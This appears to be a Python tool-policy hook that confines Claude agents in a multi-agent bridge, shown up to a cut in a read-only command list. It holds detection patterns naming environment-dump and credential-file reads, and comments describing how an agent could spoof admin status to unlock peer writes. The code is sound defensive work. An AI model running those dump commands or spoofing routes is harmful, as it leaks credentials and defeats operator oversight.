#!/usr/bin/env python3
"""Claude tool policy hook for cross-agent isolation and audit trail."""

from __future__ import annotations

import fnmatch
import hashlib
import json
import os
import pwd
import re
import shlex
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent

# Import bridge_hook_common from this hooks/ directory directly. ROOT (the
# bridge home) cannot be added to sys.path under linux-user isolation because
# the isolated UID may have only ``--x`` ACL on it, so listdir() based finders
# fail. hooks/ remains readable+executable for isolated UIDs.
_HOOKS_DIR = Path(__file__).resolve().parent
if str(_HOOKS_DIR) not in sys.path:
    sys.path.insert(0, str(_HOOKS_DIR))

from bridge_hook_common import (  # noqa: E402
    agent_home_root,
    agent_root_v2,
    bridge_home_dir,
    bridge_script_dir,
    current_agent,
    current_agent_class,
    current_agent_workdir,
    emit_system_cross_agent_read,
    load_guard_module,
    path_within,
    truncate_text,
    under_isolated_uid,
    write_audit,
)

_guard = load_guard_module(
    ROOT,
    required_attrs=(
        "analyze_text",
        "is_builtin_tool",
        "prompt_guard_enabled",
        "sanitize_text",
        "threshold_for_surface",
        "tool_output_text",
    ),
)
if _guard is None:
    # Guard module unavailable (missing/unreadable/syntax/missing-symbol).
    # Exit silently rather than tracebacking every hook invocation; a broken
    # guard module is a corrupt install state for the operator to diagnose,
    # not a reason to brick every Claude session.
    sys.exit(0)

analyze_text = _guard.analyze_text
is_builtin_tool = _guard.is_builtin_tool
prompt_guard_enabled = _guard.prompt_guard_enabled
sanitize_text = _guard.sanitize_text
threshold_for_surface = _guard.threshold_for_surface
tool_output_text = _guard.tool_output_text

# Importing the system-config protected-path SSOT requires lib/ on sys.path.
# Keep this scoped to tool-policy.py rather than mutating bridge_hook_common
# so the additional import surface stays auditable in one place.
_LIB_DIR = ROOT / "lib"
if _LIB_DIR.is_dir() and str(_LIB_DIR) not in sys.path:
    sys.path.insert(0, str(_LIB_DIR))

from system_config_paths import (  # noqa: E402
    is_protected_path,
    matched_pattern,
    protected_literal_suffixes,
)

# Issue #1569: bounded AskUserQuestion escalation. The helper lives in this
# hooks/ directory (already on sys.path via _HOOKS_DIR) and is imported
# defensively — a missing/broken helper must NOT brick every Claude session,
# it just means the AskUserQuestion intercept is inert (the tool falls through
# to its normal, unbounded behavior, i.e. no regression for other tools).
try:
    import askuserquestion_escalate as _auq_escalate  # noqa: E402
except Exception:  # noqa: BLE001 — see rationale above
    _auq_escalate = None  # type: ignore[assignment]


def roster_local_path() -> Path:
    return bridge_home_dir() / "agent-roster.local.sh"


def task_db_path() -> Path:
    return bridge_home_dir() / "state" / "tasks.db"


CLAUDE_CREDENTIAL_DENY_REASON = (
    "Claude OAuth credentials are blocked inside tool calls; use a redacted "
    "diagnostic such as `claude auth status` instead"
)


def _resolve_existing(path: Path) -> Path:
    try:
        return path.expanduser().resolve()
    except OSError:
        return path.expanduser()


def _controller_home_dir() -> Path | None:
    try:
        return Path(pwd.getpwuid(bridge_home_dir().stat().st_uid).pw_dir)
    except (KeyError, OSError):
        return None


def claude_credential_paths() -> set[Path]:
    paths = {Path.home() / ".claude" / ".credentials.json"}
    config_dir = os.environ.get("CLAUDE_CONFIG_DIR", "").strip()
    if config_dir:
        paths.add(Path(config_dir).expanduser() / ".credentials.json")
    controller_home = _controller_home_dir()
    if controller_home is not None:
        paths.add(controller_home / ".claude" / ".credentials.json")
    # PR #799 r2 codex finding 2 — the Claude OAuth token registry honors
    # $BRIDGE_CLAUDE_TOKEN_REGISTRY (override) before falling back to
    # $BRIDGE_RUNTIME_SECRETS_DIR/claude-oauth-tokens.json (see
    # bridge-auth.sh:27 bridge_auth_registry_path). Both surfaces must be
    # denied so Read/Glob/Grep/Bash-by-path access mirrors the raw-text
    # deny in `_raw_mentions_claude_credentials`.
    registry_override = os.environ.get("BRIDGE_CLAUDE_TOKEN_REGISTRY", "").strip()
    if registry_override:
        paths.add(Path(registry_override).expanduser())
    runtime_secrets = os.environ.get("BRIDGE_RUNTIME_SECRETS_DIR", "").strip()
    if runtime_secrets:
        paths.add(Path(runtime_secrets).expanduser() / "claude-oauth-tokens.json")
    return {_resolve_existing(path) for path in paths}


def _path_is_claude_credentials(path: Path) -> bool:
    expanded = _resolve_existing(path)
    if expanded in claude_credential_paths():
        return True
    parts = expanded.parts
    return len(parts) >= 2 and parts[-2:] == (".claude", ".credentials.json")


def _raw_mentions_claude_credentials(raw: str) -> bool:
    return (
        "sk-ant-o" in raw
        or (".credentials.json" in raw and ".claude" in raw)
        # PR #799 r2/r3 defense-in-depth — Path A no longer delivers the
        # active OAuth token through the tool-inherited environment, but
        # block the variable name so stale launch env files or manual
        # operator exports cannot be read through tool output.
        or "CLAUDE_CODE_OAUTH_TOKEN" in raw
        # PR #799 r2 codex finding 1 — block `launch-secrets.env`
        # mentions (defense-in-depth for any future env vars added to
        # the same file).
        or "launch-secrets.env" in raw
        # PR #799 r2 codex finding 2 — block reads of the token
        # registry JSON. The `claude_credential_paths()` set covers the
        # canonical and override paths for path-typed inputs; this
        # substring rule covers raw Bash text that names the file by
        # basename or a relative path.
        or "claude-oauth-tokens.json" in raw
    )


# PR #799 r3 codex finding 1 — match process-environment dump verbs
# that revealed the exported CLAUDE_CODE_OAUTH_TOKEN under the abandoned
# env-token delivery path. Path A now syncs Claude OAuth through
# .credentials.json instead, but keep this as a stale-env/manual-export
# guard; the r2 substring deny above only matches raw text containing the
# literal token-variable name.
#
# Coverage:
#   env [/options]            POSIX env, dumps everything when called with no
#                             positional COMMAND or piped
#   printenv [VAR...]         no-arg dump and `printenv CLAUDE_CODE_OAUTH_TOKEN`
#   set                       bash builtin with no args dumps all vars
#   compgen -e                completion list of exported vars
#   declare -p / declare -x   prints all / all exported vars
#   typeset -p / typeset -x   ksh-style alias for declare
#   export -p                 prints all exported vars
#   /proc/<pid>/environ       Linux env dump via procfs (also /proc/self/environ)
#
# Word-boundary patterns avoid matching legitimate token substrings
# such as `environment`, `setfacl`, `kubectl set image`, or `set -e`.
# Routed to the same CLAUDE_CREDENTIAL_DENY_REASON as the substring
# deny — no second reason constant.
# `env` and `printenv` regexes re-derived on 2026-05-16. Two rounds:
#
#   r1 (initial fix for operator-flagged false positive): the original
#       `(?<![A-Za-z0-9_/])env(?![A-Za-z0-9_])` matched every standalone
#       occurrence of the word `env` regardless of context, so task
#       titles or commit subjects containing natural language like
#       "stale env override" tripped the credential-deny path. r1
#       added `-` and `.` to the lookbehind and required a terminator
#       immediately after `env`.
#
#   r2 (codex PR #925 needs-more): r1 newly missed real dump shapes
#       where `env` carries options/assignments but no utility command:
#       `env VAR=value`, `env -u CLAUDE_CODE_OAUTH_TOKEN`, `env -0`,
#       `env --null`, `env 1>/tmp/dump`, `env 1>&2`, `env # comment`.
#       POSIX env prints the environment when no utility is given, so
#       each of those leaks the parent process env.
#
# Final semantics for `env`:
#   - Lookbehind excludes `[A-Za-z0-9_/.\-]` so `show-env`, `printenv`,
#     `.env` do NOT match (preserves the natural-language fix).
#   - After `env\b`, the regex consumes zero-or-more option/assignment
#     tokens — short opt `-X` (with optional packed value), separated
#     arg form `-u VAR` for short opts that take a follow-on arg (the
#     POSIX `-u/-S/-P/-C` set), long opt `--name`, or `VAR=value`
#     assignment.
#   - The match completes when after those tokens the next non-space
#     thing is a statement terminator, redirect (incl. FD-prefixed `1>`
#     / `2>&1` / `>>`), an inline comment `#`, a subshell-close `)`,
#     a backtick, or end-of-string.
#   - Crucially, if the next thing is a bare word (utility command),
#     the match fails — so `env -i bash`, `env VAR=val cmd`,
#     `env -u FOO cmd` still pass through.
#
# `printenv` is always a dump on invocation (with or without VAR
# args), so only the command-position precondition is enforced.
# Natural prose ("use printenv to check") passes; real invocations
# still trip.
_ENV_DUMP_PATTERNS = (
    re.compile(
        r"""
        (?<![A-Za-z0-9_/.\-]) env \b
        (?:
            # Long option with separated arg (GNU forms that print env
            # with no utility -- codex PR #925 r3+r4): --unset NAME,
            # --split-string ARG. The signal-control opts
            # (--ignore-signal / --default-signal / --block-signal) are
            # NOT in this list because GNU env treats the next token as
            # the COMMAND, not as the signal arg, in the separated form
            # (verified by codex r4 against /opt/homebrew/bin/genv,
            # exit 127 "No such file or directory"). Their =value form
            # is still a dump and is matched by the long-opt branch
            # below.
            \s+ --(?: unset | split-string )
              \s+ \S+
          | \s+ -- [A-Za-z0-9_-]* (?: = \S* )?   # long option, incl. GNU --name=value
          | \s+ -[uSPC] \s+ \S+                 # short opt that takes a separated arg
          | \s+ -[A-Za-z0-9][A-Za-z0-9]*        # short opt or packed -uVAR
          | \s+ [A-Za-z_][A-Za-z0-9_]* = \S*    # VAR=value assignment
        )*
        \s*
        (?:
            $                                    # end of string
          | \#                                   # inline comment
          | [\n;|&)]                            # statement terminator / subshell close
          | [0-9]* [<>]                         # redirect (FD-prefixed or bare)
          | `                                    # backtick close
        )
        """,
        re.VERBOSE,
    ),
    # `printenv` is always dangerous when invoked (with or without VAR
    # args), so only the command-position precondition is enforced — no
    # trailing terminator requirement. The prefix `(?:^|[\n;&|`()<>])`
    # consumes the separator, but re.search only cares about existence.
    # Natural-language "use printenv to check" (preceded by a space
    # which is not in the separator set) no longer matches.
    re.compile(r"(?:^|[\n;&|`()<>])\s*printenv\b"),
    # bare `set` with no args (dumps all vars). Same noise-reduction as
    # the env/printenv tightenings — natural language "the var was set"
    # used to match because the prior class `[;\s|&]` allowed a plain
    # whitespace prefix, which is indistinguishable from "verb at end of
    # an English sentence". The new prefix `[\n;|&` + subshell/backtick
    # delimiters` excludes pure whitespace, so `the var was set` falls
    # through. Dangerous shapes (`set`, `set | head`, `;set`, `$(set)`,
    # `set > file`) still match because the prefix is consumed and the
    # trailing terminator class is unchanged.
    re.compile(r"(?:^|[\n;|&`()<>])\s*set\s*(?=$|[\n;|&<>`)])"),
    re.compile(r"(?<![A-Za-z0-9_])compgen\s+-[A-Za-z]*e"),
    re.compile(r"(?<![A-Za-z0-9_])declare\s+-[A-Za-z]*[xp]"),
    re.compile(r"(?<![A-Za-z0-9_])typeset\s+-[A-Za-z]*[xp]"),
    re.compile(r"(?<![A-Za-z0-9_])export\s+-p(?![A-Za-z0-9_])"),
    re.compile(r"/proc/[^/\s]+/environ\b"),
)


def _raw_dumps_process_environment(raw: str) -> bool:
    return any(p.search(raw) for p in _ENV_DUMP_PATTERNS)


def claude_credentials_reason_for_path(path: Path) -> str | None:
    if _path_is_claude_credentials(path):
        return CLAUDE_CREDENTIAL_DENY_REASON
    return None


def admin_agent_id() -> str:
    return os.environ.get("BRIDGE_ADMIN_AGENT_ID", "").strip()


def _admin_agent_from_session_type(agent: str) -> bool:
    try:
        session_type_path = agent_home_root() / agent / "SESSION-TYPE.md"
        if not session_type_path.is_file():
            return False
        for raw_line in session_type_path.read_text(errors="replace").splitlines():
            line = raw_line.strip().lstrip("-").strip()
            if not line.lower().startswith("session type:"):
                continue
            value = line.split(":", 1)[1].strip().lower()
            return value == "admin"
    except Exception:
        return False
    return False


def is_admin_agent(agent: str) -> bool:
    admin = admin_agent_id()
    if admin and agent == admin:
        return True
    if agent and _admin_agent_from_session_type(agent):
        return True
    return False


# Issue #1806 — the STRICT, anti-spoof admin predicate that gates every new
# allow+audit loosening in this change.
#
# `is_admin_agent` is OR-logic: an admin assertion via EITHER
# `BRIDGE_ADMIN_AGENT_ID` env match OR `SESSION-TYPE.md == admin` is enough.
# That OR is fine for low-stakes diagnostic/display surfaces, but it is NOT
# safe to use as the gate for the cross-agent-write / expansion-downgrade /
# sqlite3 carve-outs #1806 adds:
#
#   - The `SESSION-TYPE.md` leg (`_admin_agent_from_session_type`) reads a
#     file INSIDE the agent's own home. In shared mode the controller UID ==
#     the agent UID, so the agent can write `session type: admin` into its
#     own `SESSION-TYPE.md` and an ownership/st_uid check does not help — the
#     file is agent-writable. An attacker-controlled agent could thereby
#     self-assert admin and unlock peer-home WRITES. We therefore do NOT use
#     the SESSION-TYPE.md leg here at all.
#   - The `BRIDGE_ADMIN_AGENT_ID` env alone is also insufficient: an agent
#     can `export BRIDGE_ADMIN_AGENT_ID=<self>` into its own session before
#     the hook runs, flipping the env-leg True without ever being the
#     operator-configured admin.
#
# The strict predicate requires BOTH halves to AGREE, where the second half
# is sourced from the CONTROLLER-PUBLISHED roster (the `agent-bridge agent
# list --json` CLI, which executes the controller's roster-load against the
# git-ignored `agent-roster.local.sh` the agent cannot write through the
# guard), NOT from any agent-writable file:
#
#   1. `BRIDGE_ADMIN_AGENT_ID` is set (non-empty) AND equals *agent*.
#   2. The controller roster reports a row for *agent* with `admin == true`
#      AND `source == "static"` (the admin is a registered static role;
#      `bridge_require_admin_agent` enforces static at the bridge layer).
#
# ANY disagreement, lookup failure, malformed payload, subprocess error, or
# timeout fails CLOSED → treated as NON-admin → the carve-out does not fire
# and the command stays denied. This is the only predicate the #1806
# loosenings consult.

# Fixed OS temp roots a sandboxed BRIDGE_HOME may live under (matches
# scripts/smoke-test.sh's own non-temp refusal guard). The roster-JSON test
# seam is honored ONLY when the bridge home resolves under one of these, so the
# seam is inert in a production install (`~/.agent-bridge`).
#
# SECURITY (PR #1810 r2): these are *fixed* roots only — never a value read
# from an attacker-controllable env var. An earlier revision appended
# ``$TMPDIR`` to this set, which let an attacker who controls the hook
# environment set ``TMPDIR`` to the parent of the real production home
# (e.g. ``TMPDIR=/Users/sean`` with ``BRIDGE_HOME=/Users/sean/.agent-bridge``)
# and thereby make the *production* home classify as test-temp — honoring a
# forged ``BRIDGE_GUARD_ADMIN_ROSTER_JSON`` and spoofing admin. `$TMPDIR` is
# deliberately NOT trusted as a root here. ``tempfile.gettempdir()`` is
# consulted only as an additional *fixed* root after its own realpath is proven
# to resolve under one of these canonical roots, so it cannot be repointed at a
# production path.
_TEST_TEMP_PREFIXES = ("/tmp", "/private/tmp", "/var/folders", "/private/var/folders")


def _fixed_temp_roots() -> list[str]:
    """Return canonical (realpath'd) fixed OS temp roots the seam may trust.

    Only ``_TEST_TEMP_PREFIXES`` plus ``tempfile.gettempdir()`` — and the
    latter ONLY when its own realpath already resolves under one of the fixed
    prefixes, so a repointed ``$TMPDIR`` (which ``gettempdir()`` honors) cannot
    smuggle in a production root. No raw env var is ever trusted as a root.
    """
    roots: list[str] = []
    seen: set[str] = set()

    def _add(real: str) -> None:
        if real and real not in seen:
            seen.add(real)
            roots.append(real)

    fixed_reals: list[str] = []
    for prefix in _TEST_TEMP_PREFIXES:
        try:
            real = os.path.realpath(prefix)
        except OSError:
            continue
        fixed_reals.append(real)
        _add(real)

    # tempfile.gettempdir() reflects $TMPDIR; accept it only if it canonically
    # lands under one of the fixed roots above. This keeps "the OS temp dir"
    # working on platforms whose realpath differs while refusing an attacker's
    # production-parent $TMPDIR.
    try:
        gtmp = os.path.realpath(tempfile.gettempdir())
    except OSError:
        gtmp = ""
    if gtmp:
        for real in fixed_reals:
            if gtmp == real or gtmp.startswith(real.rstrip("/") + "/"):
                _add(gtmp)
                break
    return roots


def _bridge_home_is_test_temp() -> bool:
    """True iff the resolved bridge home sits under a FIXED OS temp root.

    Used to gate the ``BRIDGE_GUARD_ADMIN_ROSTER_JSON`` seam so it is honored
    only inside the smoke sandbox; a production session ignores the env var.

    The trusted roots are fixed (``_fixed_temp_roots``); no env var (notably
    ``$TMPDIR``) can repoint them at a production path. Both the candidate home
    and the roots are canonicalized with ``os.path.realpath`` and containment
    is required.
    """
    try:
        home = os.path.realpath(str(bridge_home_dir()))
    except (OSError, RuntimeError):
        return False
    for root in _fixed_temp_roots():
        if home == root or home.startswith(root.rstrip("/") + "/"):
            return True
    return False


def _controller_roster_admin_agreement(agent: str) -> bool:
    """True iff the CONTROLLER-published roster confirms *agent* is the
    admin static role.

    The authoritative channel is the `agent-bridge agent list --json` CLI:
    it runs the controller's roster loader (reading the protected,
    git-ignored ``agent-roster.local.sh``), not a file the agent can edit.
    A row qualifies only when ``agent`` matches, ``admin`` is boolean True,
    and ``source`` is ``"static"``.

    Test seam: ``BRIDGE_GUARD_ADMIN_ROSTER_JSON`` may point at a readable JSON
    roster snapshot the smokes inject — BUT it is honored ONLY when the bridge
    home resolves under a temp/test prefix (``_bridge_home_is_test_temp``). A
    production session (``BRIDGE_HOME=~/.agent-bridge``) IGNORES the env var
    entirely and consults only the real CLI, so an agent cannot grant itself
    admin by exporting a forged-roster path: the seam is inert outside the
    test sandbox. This keeps the anti-spoof anchor (a controller-owned roster
    read via the CLI) the sole authority in production.

    Fail-closed: any subprocess / parse / shape error returns False.
    """
    if not agent:
        return False
    rows: list[dict[str, Any]] | None = None
    fixture = os.environ.get("BRIDGE_GUARD_ADMIN_ROSTER_JSON", "").strip()
    if fixture and not _bridge_home_is_test_temp():
        # Production / non-test bridge home: ignore the seam and fall through to
        # the real CLI. The env var is inert here, so it cannot forge admin.
        fixture = ""
    if fixture:
        try:
            payload = json.loads(Path(fixture).expanduser().read_text(encoding="utf-8"))
        except (OSError, ValueError):
            return False
        rows = _roster_rows_from_payload(payload)
    else:
        try:
            cli = bridge_script_dir() / "agent-bridge"
            proc = subprocess.run(
                [str(cli), "agent", "list", "--json"],
                cwd=str(bridge_script_dir()),
                capture_output=True,
                text=True,
                check=False,
                timeout=10,
            )
        except (OSError, subprocess.SubprocessError):
            return False
        if proc.returncode != 0 or not proc.stdout.strip():
            return False
        try:
            payload = json.loads(proc.stdout)
        except ValueError:
            return False
        rows = _roster_rows_from_payload(payload)
    if rows is None:
        return False
    for row in rows:
        if row.get("agent") != agent:
            continue
        # `admin` must be a real boolean True (not a truthy string) and the
        # role must be a registered static agent. A dynamic agent that has
        # somehow been flagged admin in a forged snapshot still fails the
        # `source == "static"` gate.
        if row.get("admin") is True and row.get("source") == "static":
            return True
        return False
    return False


def _roster_rows_from_payload(payload: Any) -> list[dict[str, Any]] | None:
    """Normalize the `agent list --json` payload into a list of row dicts.

    Accepts either a bare list of rows or an object wrapping them under
    ``agents`` / ``rows`` (mirrors :func:`_resolve_home_via_roster`).
    Returns ``None`` for an unrecognized shape so the caller fails closed.
    """
    if isinstance(payload, list):
        return [row for row in payload if isinstance(row, dict)]
    if isinstance(payload, dict):
        candidates = payload.get("agents") or payload.get("rows") or []
        if isinstance(candidates, list):
            return [row for row in candidates if isinstance(row, dict)]
    return None


def is_trusted_admin_agent_for_guard(agent: str) -> bool:
    """STRICT anti-spoof admin predicate for the #1806 allow+audit carve-outs.

    Requires BOTH the env-asserted admin id AND controller-roster agreement
    (see the module note above). Never consults ``SESSION-TYPE.md``. Fails
    closed on any disagreement or lookup failure → non-admin → deny.
    """
    admin = admin_agent_id()
    if not admin or admin != agent:
        return False
    return _controller_roster_admin_agreement(agent)


def _emit_admin_credential_read_allowed(
    agent: str,
    *,
    tool: str,
    surface: str,
    sample: str = "",
    tool_input: dict[str, Any] | None = None,
) -> None:
    """Audit an admin agent's read-intent bypass of a credential-deny path.

    Admin agents (system agents acting as the operator's deputy) are
    allowed to perform diagnostic reads (``cat`` / ``ls`` / ``stat`` /
    ``grep`` / ``head`` / ``tail`` / Read / Glob / Grep / NotebookRead)
    against the Claude OAuth credential path and to inspect their own
    process environment. Mutation deny paths (roster local, system
    config, queue DB) stay enforced — admin still flows mutations
    through ``agent-bridge config set``.

    Every bypass writes an ``agent_admin_credential_read_allowed`` audit
    row so the operator retains a full ledger of admin credential
    reads. ``surface`` is the deny path that was bypassed
    (``raw_credentials_mention`` / ``raw_env_dump`` / ``argv_path`` /
    ``input_path``) and ``sample`` is a truncated copy of the offending
    text or path for post-hoc inspection.

    The audit row mirrors the deny-row shape (``agent_tool_denied``):
    when the caller supplies ``tool_input`` we emit the same
    ``summary`` block ``tool_input_summary`` would produce, so a single
    audit consumer can read allow + deny rows uniformly (codex PR #881
    r1 finding 3). Bash callers without ``tool_input`` can pass
    ``sample=text`` and it will be lifted into ``summary.command``.
    """
    detail: dict[str, Any] = {
        "tool": tool,
        "surface": surface,
    }
    # Codex r2 BLOCKING (r3, 2026-05-29, #1358): an admin read-intent
    # command can carry a raw OAuth token (e.g. `echo sk-ant-o-…`
    # classifies as read-intent and is ALLOWED here). The raw `sample`
    # and `summary` would persist the token in this allow row. Redact
    # token-shaped VALUES while keeping the path / pattern structure as
    # the forensic anchor (a credential file PATH is acceptable to keep;
    # a token VALUE is not).
    if sample:
        detail["sample"] = _redact_credential_token_values(
            truncate_text(sample, 200)
        )
    # Mirror the deny-row `summary` field. Prefer the structured
    # `tool_input_summary` shape when caller has the full tool_input;
    # otherwise synthesize a minimal Bash summary from `sample` so the
    # audit row still carries the structured field deny consumers
    # expect.
    if tool_input is not None:
        detail["summary"] = _redact_credential_summary(
            tool_input_summary(tool, tool_input)
        )
    elif sample and tool == "Bash":
        detail["summary"] = {
            "command": _redact_credential_token_values(
                truncate_text(sample, 240)
            ),
            "description": "",
        }
    write_audit("agent_admin_credential_read_allowed", agent or "unknown", detail)


_NON_AGENT_ENTRIES: frozenset[str] = frozenset({
    # `shared` is the canonical symlink to BRIDGE_SHARED_DIR. Treating it
    # as a peer agent home used to collapse every shared-dir write into
    # the "cross-agent access blocked" rejection (issue #240).
    "shared",
    # Profile template shipped under agents/; never a real agent, but
    # `is_dir()` returns True for it so it used to false-positive as a
    # peer.
    "_template",
    # Framework-internal dotfile. `bridge-agent.sh create` does not
    # reserve leading-dot names today (Codex round-2 repro: `create
    # .real --dry-run` succeeds), so the exclusion has to be an exact
    # match, not a prefix rule — otherwise a legitimate `.real` agent
    # would silently lose cross-agent detection.
    ".claude",
})


def _enumerate_peer_dirs_under(root: Path, agent: str) -> list[Path]:
    """Return every sibling agent directory directly under *root*, skipping
    the acting agent's own entry and the non-agent allowlist.

    Shared by the legacy v1 (`agent_home_root()`) and v2 (`agent_root_v2()`)
    peer enumeration so the iso fail-open and non-agent filtering logic stays
    in one place. The caller is responsible for mapping each returned per-agent
    directory to the concrete forbidden tree (the v1 home IS the dir; the v2
    home is its `home/` child — see `other_agent_homes`).
    """
    dirs: list[Path] = []
    if not root.exists():
        return dirs
    # Issue #1205 Family A: under iso v2 the agent-home root is owned by
    # the controller with mode ``drwx--x---`` — the isolated UID has
    # traverse-only permission and ``iterdir()`` raises PermissionError.
    # That is the iso v2 contract working as designed (cross-agent peer
    # enumeration is intentionally blocked from the iso UID). Catching
    # PermissionError + OSError and returning ``[]`` under iso is safe
    # because the OS already enforces the cross-agent boundary;
    # downstream consumers (`target_agent_for_*`) failing to match a
    # peer from the iso UID is fine. Controller-side callers still
    # raise so a genuine permission regression continues to surface.
    try:
        candidates = list(root.iterdir())
    except (PermissionError, OSError):
        if under_isolated_uid():
            try:
                write_audit(
                    "hook_permission_fail_open.agent_home_enumeration",
                    str(root),
                    {"operation": "iterdir"},
                )
            except Exception:  # noqa: BLE001 — best-effort, never block hooks
                pass
            return dirs
        raise
    for candidate in candidates:
        # ``is_dir()`` can also raise under iso (broken / dangling /
        # cross-UID permission) — same gate: under iso skip, controller
        # re-raises.
        try:
            is_dir = candidate.is_dir()
        except (PermissionError, OSError):
            if under_isolated_uid():
                continue
            raise
        if not is_dir:
            continue
        name = candidate.name
        if not name:
            continue
        if name == agent:
            continue
        if name in _NON_AGENT_ENTRIES:
            continue
        dirs.append(candidate)
    return dirs


def other_agent_homes(agent: str) -> list[Path]:
    """Return every sibling agent home — across BOTH the legacy v1 tree
    (`agent_home_root()`, ``~/.agent-bridge/agents/<peer>``) AND the v2 split
    layout (`agent_root_v2()`, ``$BRIDGE_DATA_ROOT/agents/<peer>/home``).

    Issue #1823: before this, enumeration consulted the v1 root ONLY, so on a
    v2-layout install (the current default) a non-admin agent could Edit / Write
    / Bash-append a PEER's v2 home ``data/agents/<other>/home/…`` with no denial
    — the documented per-agent containment was not in force for the homes
    sessions actually run from. The legacy ``agents/<other>/`` tree stayed
    correctly blocked, which masked the gap. Enumerating both roots is a pure
    TIGHTENING: it only ADDS v2 peer homes to the forbidden set, so it can only
    add non-admin cross-agent denies and never changes admin behavior (admin
    peer-home access keeps its own carve-outs upstream of every consumer here).

    SCOPE — v2 HOME only, NOT the v2 workdir (``data/agents/<peer>/workdir``):
    the documented ``<admin>-dev`` codex pair *shares the admin's workdir* (the
    #1492 shared-workspace pair-review contract — only the cwd is shared; homes
    and hooks stay distinct). Adding the v2 workdir to the forbidden set would
    false-deny the pair's legitimate writes into the shared workspace. The home
    is never shared, so denying cross-agent v2-home writes is always correct.
    The v2 workdir is left as a follow-up (it would need the shared-pair
    carve-out to land first).

    A single peer that exists in BOTH trees contributes BOTH forbidden paths
    (the v1 home dir and the v2 ``<peer>/home`` dir) — both are real on-disk
    trees and both must deny. Name-level dedup is unnecessary because the two
    paths are distinct and every consumer keys off ``_peer_home_agent_name`` /
    ``_peer_home_suffix`` (below), which recover the agent name from either
    shape.

    Excludes only entries that are never real agents on a standard install —
    an exact-name allowlist, no prefix heuristic (see ``_NON_AGENT_ENTRIES``):
    the ``shared`` symlink alias (issue #240), ``_template``, ``.claude``.
    Everything else — including agents whose names start with ``_`` or ``.`` —
    stays in the list (codex rounds 1/2 on PR #242).
    """
    homes: list[Path] = _enumerate_peer_dirs_under(agent_home_root(), agent)
    # Issue #1823: add the v2 per-agent home (the `home/` child of each peer's
    # v2 agent dir). The v2 root may be absent (legacy install) — then this is
    # a no-op and behavior is byte-identical to the pre-#1823 v1-only set.
    root_v2 = agent_root_v2()
    if root_v2 is not None:
        for peer_dir in _enumerate_peer_dirs_under(root_v2, agent):
            homes.append(peer_dir / "home")
    return homes


def _peer_home_agent_name(home: Path) -> str:
    """Recover the peer agent NAME from a path returned by `other_agent_homes`.

    Issue #1823: a v1 entry IS the agent home dir (``…/agents/<name>`` →
    ``.name`` is the agent), while a v2 entry is the ``home/`` child
    (``…/agents/<name>/home`` → ``.name`` is ``"home"`` and the agent name is
    the parent's). Discriminate by anchoring on `agent_root_v2()` rather than a
    bare ``name == "home"`` heuristic, so a v1 agent that is literally named
    ``home`` is not misread.
    """
    root_v2 = agent_root_v2()
    if root_v2 is not None and home.name == "home" and home.parent.parent == root_v2:
        return home.parent.name
    return home.name


def _peer_home_suffix(home: Path) -> str:
    """Return the prefix-spelling-agnostic forbidden SUFFIX for a peer home.

    Issue #1823: a v1 home denies the whole ``/agents/<name>`` subtree (in v1
    the agent dir IS the home), while a v2 home denies only
    ``/agents/<name>/home`` — NOT ``/agents/<name>/workdir`` (the shared-pair
    workspace, see `other_agent_homes`). The ``/agents/<name>`` /
    ``/agents/<name>/home`` tail is spelling-agnostic: it matches the absolute,
    ``~``, ``$HOME``, ``$BRIDGE_HOME``, ``$BRIDGE_DATA_ROOT`` and brace
    spellings alike, all of which end in that suffix.
    """
    name = _peer_home_agent_name(home)
    root_v2 = agent_root_v2()
    if root_v2 is not None and home.name == "home" and home.parent.parent == root_v2:
        return f"/agents/{name}/home"
    return f"/agents/{name}"


def target_agent_for_path(path: Path, agent: str) -> str | None:
    for other_home in other_agent_homes(agent):
        if path_within(path, other_home):
            return _peer_home_agent_name(other_home)
    return None


def target_agent_for_text(text: str, agent: str) -> str | None:
    # Issue #1823 NOTE: this builds the v1-spelling substring needles only and
    # is used SOLELY to populate the `target_agent` AUDIT label in the PreToolUse
    # entrypoint (`detect_target_agent` → `handle_pretool`); it is NOT the deny
    # decision for Bash (that is `protected_alias_reason`). Deliberately NOT
    # extended with v2-home spellings: doing so would attach a peer label to an
    # ADMIN command whose v2 peer write is legitimately allowed by policy
    # (admin behavior must not change). The authoritative non-admin v2 deny is
    # the admin-gated suffix matcher `_peer_forbidden_suffixes`.
    home_root = agent_home_root()
    for other in other_agent_homes(agent):
        name = _peer_home_agent_name(other)
        needles = [
            f"{home_root}/{name}/",
            f"{home_root}/{name}",
            f"~/.agent-bridge/agents/{name}/",
            f"~/.agent-bridge/agents/{name}",
            f"$HOME/.agent-bridge/agents/{name}/",
            f"$HOME/.agent-bridge/agents/{name}",
        ]
        for needle in needles:
            if needle in text:
                return name
    return None


def detect_target_agent(tool_name: str, tool_input: dict[str, Any], agent: str) -> str | None:
    if tool_name == "Bash":
        command = str(tool_input.get("command") or "")
        if command:
            return target_agent_for_text(command, agent)
        return None
    for key in ("file_path", "path"):
        raw = str(tool_input.get(key) or "").strip()
        if not raw:
            continue
        try:
            candidate = Path(raw).expanduser()
        except Exception:
            continue
        target = target_agent_for_path(candidate, agent)
        if target:
            return target
    return None


SYSTEM_CONFIG_DENY_REASON = (
    "system config path requires `agent-bridge config set` "
    "(direct Edit/Write blocked by issue #341 gating)"
)

ROSTER_LOCAL_DENY_REASON = (
    "agent-roster.local.sh is a protected system config path. "
    "For a durable env override use `agent-bridge config set-env "
    "KEY=VALUE` (issue #1734); for a JSON config field use `agent-bridge "
    "config set`. Admin role does not exempt this path — the wrapper "
    "preserves the audit chain."
)


# Read-intent Bash command names. The protected-path gate is about
# preserving the #341 write-audit chain; reads do not mutate state and
# should not be denied regardless of agent identity (issue #383).
#
# A command is treated as read-intent when ALL pipeline stages start
# with one of these tokens. A single write-intent (or unknown) leading
# command anywhere disqualifies the whole invocation — that keeps the
# bar at "this command provably does not mutate the protected path"
# rather than at "this command might be safe".
_READ_INTENT_BASH_COMMANDS = frozenset(
    {
        "cat",
        "grep",
        "egrep",
        "fgrep",
        "rg",
        "head",
        "tail",
        "less",
        "more",
        "view",
        "wc",
        "stat",
        "file",
        "md5sum",
        "sha256sum",
        "sha1sum",
        "xxd",
        "od",
        "diff",
        "cmp",
        "ls",
        "find",
        "awk",
        # Issue #1806 (3d): `sed` is a pure stdout filter UNLESS it carries the
        # in-place flag. The `sed -i` / `sed -i…` write-mode forms are rejected
        # in `_is_read_intent_bash` (the leader-specific guard that already
        # existed for this entry's sake), so `sed -n 1,40p <file>` and other
        # read shapes classify read-intent while `sed -i …` stays write-intent.
